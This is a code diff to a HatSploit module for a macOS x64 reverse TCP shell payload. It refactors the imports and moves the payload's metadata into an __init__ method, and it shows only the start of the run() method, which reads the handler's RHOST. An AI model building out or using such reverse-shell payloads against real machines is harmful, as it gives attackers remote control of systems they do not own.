@@ -3,25 +3,27 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
+from hatsploit.lib.payload import Payload
 from pex.assembler import Assembler
 from pex.socket import Socket
 
-from hatsploit.lib.payload import Payload
-
 
 class HatSploitPayload(Payload, Assembler, Socket):
-    details = {
-        'Name': "macOS x64 Shell Reverse TCP",
-        'Payload': "macos/x64/shell_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer',
-        ],
-        'Description': "Shell reverse TCP payload for macOS x64.",
-        'Architecture': "x64",
-        'Platform': "macos",
-        'Rank': "high",
-        'Type': "reverse_tcp",
-    }
+    def __init__(self):
+        super().__init__()
+
+        self.details = {
+            'Name': "macOS x64 Shell Reverse TCP",
+            'Payload': "macos/x64/shell_reverse_tcp",
+            'Authors': [
+                'Ivan Nikolsky (enty8080) - payload developer',
+            ],
+            'Description': "Shell reverse TCP payload for macOS x64.",
+            'Architecture': "x64",
+            'Platform': "macos",
+            'Rank': "high",
+            'Type': "reverse_tcp",
+        }
 
     def run(self):
         rhost = self.pack_host(self.handler['RHOST'])
